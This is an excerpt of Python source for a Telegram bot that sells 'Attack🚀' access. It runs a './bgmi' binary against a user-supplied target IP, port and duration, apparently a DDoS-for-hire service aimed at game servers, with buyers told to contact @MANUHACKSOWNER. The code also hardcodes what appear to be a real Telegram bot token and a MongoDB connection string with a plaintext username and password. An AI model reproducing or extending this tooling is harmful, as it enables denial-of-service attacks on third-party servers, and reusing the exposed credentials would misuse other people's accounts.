...
TOKEN = '7794447221:AAGIQ540VzzZioojDUaZ3_cjn2lA2WLWZ3Q'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002248694013
CHANNEL_ID = -1002248694013
error_channel_id = -1002248694013
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} 90"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the Attack🚀 command. "
                    ...
                    "🌟THE ONLY OWNER IS @MANUHACKSOWNER DM TO BUY ACCESS*", parse_mode='Markdown')
...
def process_attack_command(message):
    try:
        ...
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: Attack🚀*", parse_mode='Markdown')
            return
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/MANUHACKSOWNER*", parse_mode='Markdown')
